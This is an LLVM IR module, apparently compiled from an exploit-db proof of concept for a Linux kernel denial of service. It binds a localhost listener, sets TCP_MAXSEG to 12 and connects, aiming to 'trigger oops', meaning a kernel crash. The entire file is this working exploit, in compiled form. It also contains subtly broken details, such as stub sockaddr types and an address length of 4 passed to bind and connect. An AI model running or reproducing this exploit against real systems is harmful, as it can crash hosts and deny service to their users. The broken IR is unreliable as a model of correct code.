; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_16952.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_16952.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [10 x i8] c"127.0.0.1\00", align 1
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [30 x i8] c"[-] Could not open listener.\0A\00", align 1
@TCP_MAXSEG = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [28 x i8] c"[-] Could not set sockopt.\0A\00", align 1
@.str.3 = private unnamed_addr constant [32 x i8] c"[-] Could not bind to address.\0A\00", align 1
@.str.4 = private unnamed_addr constant [23 x i8] c"[-] Could not listen.\0A\00", align 1
@.str.5 = private unnamed_addr constant [31 x i8] c"[-] Could not open connector.\0A\00", align 1
@.str.6 = private unnamed_addr constant [36 x i8] c"[-] Could not connect to listener.\0A\00", align 1
@.str.7 = private unnamed_addr constant [38 x i8] c"[-] Connection did not trigger oops.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %6 = call i32 @memset(%struct.sockaddr_in* %2, i32 0, i32 12)
  %7 = load i32, i32* @AF_INET, align 4
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i32 0, i32 2
  store i32 %7, i32* %8, align 4
  %9 = call i32 @inet_addr(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0))
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i32 0, i32 1
  %11 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %10, i32 0, i32 0
  store i32 %9, i32* %11, align 4
  %12 = call i32 @htons(i32 31337)
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i32 0, i32 0
  store i32 %12, i32* %13, align 4
  %14 = load i32, i32* @PF_INET, align 4
  %15 = load i32, i32* @SOCK_STREAM, align 4
  %16 = load i32, i32* @IPPROTO_TCP, align 4
  %17 = call i32 @socket(i32 %14, i32 %15, i32 %16)
  store i32 %17, i32* %3, align 4
  %18 = load i32, i32* %3, align 4
  %19 = icmp slt i32 %18, 0
  br i1 %19, label %20, label %22

20:                                               ; preds = %0
  %21 = call i32 @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %61

22:                                               ; preds = %0
  store i32 12, i32* %4, align 4
  %23 = load i32, i32* %3, align 4
  %24 = load i32, i32* @IPPROTO_TCP, align 4
  %25 = load i32, i32* @TCP_MAXSEG, align 4
  %26 = call i64 @setsockopt(i32 %23, i32 %24, i32 %25, i32* %4, i32 4)
  %27 = icmp slt i64 %26, 0
  br i1 %27, label %28, label %30

28:                                               ; preds = %22
  %29 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.2, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %61

30:                                               ; preds = %22
  %31 = load i32, i32* %3, align 4
  %32 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %33 = call i64 @bind(i32 %31, %struct.sockaddr* %32, i32 4)
  %34 = icmp slt i64 %33, 0
  br i1 %34, label %35, label %37

35:                                               ; preds = %30
  %36 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %61

37:                                               ; preds = %30
  %38 = load i32, i32* %3, align 4
  %39 = call i64 @listen(i32 %38, i32 1)
  %40 = icmp slt i64 %39, 0
  br i1 %40, label %41, label %43

41:                                               ; preds = %37
  %42 = call i32 @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.4, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %61

43:                                               ; preds = %37
  %44 = load i32, i32* @PF_INET, align 4
  %45 = load i32, i32* @SOCK_STREAM, align 4
  %46 = load i32, i32* @IPPROTO_TCP, align 4
  %47 = call i32 @socket(i32 %44, i32 %45, i32 %46)
  store i32 %47, i32* %5, align 4
  %48 = load i32, i32* %5, align 4
  %49 = icmp slt i32 %48, 0
  br i1 %49, label %50, label %52

50:                                               ; preds = %43
  %51 = call i32 @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.5, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %61

52:                                               ; preds = %43
  %53 = load i32, i32* %5, align 4
  %54 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %55 = call i64 @connect(i32 %53, %struct.sockaddr* %54, i32 4)
  %56 = icmp slt i64 %55, 0
  br i1 %56, label %57, label %59

57:                                               ; preds = %52
  %58 = call i32 @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.6, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %61

59:                                               ; preds = %52
  %60 = call i32 @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.7, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %61

61:                                               ; preds = %59, %57, %50, %41, %35, %28, %20
  %62 = load i32, i32* %1, align 4
  ret i32 %62
}

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i64 @setsockopt(i32, i32, i32, i32*, i32) #1

declare dso_local i64 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i64 @listen(i32, i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
